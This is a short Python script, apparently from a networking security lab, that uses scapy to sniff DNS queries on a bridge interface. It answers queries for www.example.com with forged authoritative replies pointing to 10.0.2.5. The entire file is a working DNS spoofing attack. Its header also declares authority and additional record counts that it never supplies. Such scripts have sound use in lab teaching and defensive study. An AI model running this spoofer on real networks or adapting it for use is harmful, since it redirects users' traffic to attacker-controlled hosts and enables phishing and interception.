#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  #verificăm dacă un pachet de rețea (pkt) utilizează protocolul DNS și
  #dacă numele de domeniu interogat (QNAME) în cadrul pachetului este "www.example.com".
  if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    print (pkt.sprintf("{DNS: %IP.src% -->%IP.dst%:%DNS.id%}"))
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')
    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=2,
                 an=Anssec)
    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)
# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-1ee11a571e21', filter=f, prn=spoof_dns)      
